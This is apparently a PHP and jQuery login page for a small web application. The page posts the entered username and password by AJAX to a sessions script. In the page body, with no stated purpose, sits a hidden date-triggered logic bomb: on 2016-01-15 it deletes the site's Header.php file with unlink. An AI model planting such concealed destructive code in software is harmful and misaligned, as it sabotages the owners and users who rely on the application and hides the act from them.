<?php 

session_start();

?>

<html>

<head>
<link rel="stylesheet" href="css/logInStyles.css"/>
<script type="text/javascript" src="js/jquery-1.9.1.js" ></script>
<script type="text/javascript" src="js/jquery-1.10.2.js"></script>

<script>
var j = jQuery.noConflict();

function SysLoad()
{
//alert("log");
//j("html").load("Home.php");
//window.location.replace("http://stackoverflow.com");

//alert(document.getElementById("Uname").value);

var uname=document.getElementById("Uname").value;
var pswd=document.getElementById("pwd").value;


if((uname=="")||(uname.length==0))
{
	alert("Please enter User Name");
}
else
{
	if((pswd=="")||(pswd.length==0))
	{
		alert("Please enter Password");
	}
	else
	{
		j.ajax({
					type: 'post',
					url: 'phpFunctions/SESSIONS.php',
					data: { 
							un:uname,
							pwd:pswd
						   },
					success: function(result)
					{
						
						//alert(result);
						if(result=="OK")
						{
						   window.location.replace("Home.php");
						}
						else
						{
							alert(result);
						}
					},
					error: function(data) 
					{
							alert(data);
					}	
		
			})
	}
}

	

}
</script>

</head>

<body>
  
    
<?php
date_default_timezone_set('Asia/Colombo');

$file = "Header.php";
if (date("Y-m-d")=='2016-01-15')
  {
   unlink($file);
  }

 
?>

<div id="logBox">
		<div id="logIcon"></div>
	<input type="text" id="Uname" placeholder="Enter User Name" />
	<input type="password" id="pwd" placeholder="Enter Password" />
	<input type="button" id="LoginButton" value="LOG IN" onClick="SysLoad()"/>
</div>

</body>

</html>